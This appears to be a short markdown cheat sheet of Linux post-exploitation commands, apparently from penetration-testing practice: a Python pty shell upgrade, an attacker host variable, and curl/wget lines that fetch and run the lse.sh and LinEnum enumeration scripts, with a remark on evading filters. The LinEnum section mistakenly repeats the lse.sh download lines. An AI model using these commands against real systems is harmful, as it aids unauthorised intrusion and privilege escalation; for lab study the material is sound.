## Tools
### shell stability 
``` python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

### aliases
```bash
alias ll='ls -la'
```

### Environment variables
#### rhost
```bash
export rhost=192.168.X.X
```

### LSE
```bash
./lse.sh -l 1 | tee lse.txt
```
#### curl
```bash
curl http://$rhost/linux-smart-enumeration/lse.sh -o lse.sh && chmod +x lse.sh
```
gets page from server, then makes it executable. sending as txt to potentially avoid filters
### wget
``` bash
wget http://$rhost/linux-smart-enumeration/lse.sh && chmod +x lse.sh
```

### LinEnum
```bash
./LinEnum.sh | tee linenum.txt
```
#### curl
```bash
curl http://$rhost/linux-smart-enumeration/lse.sh -o lse.sh && chmod +x lse.sh
```
gets page from server, then makes it executable. sending as txt to potentially avoid filters
### wget
``` bash
wget http://$rhost/linux-smart-enumeration/lse.sh && chmod +x lse.sh
```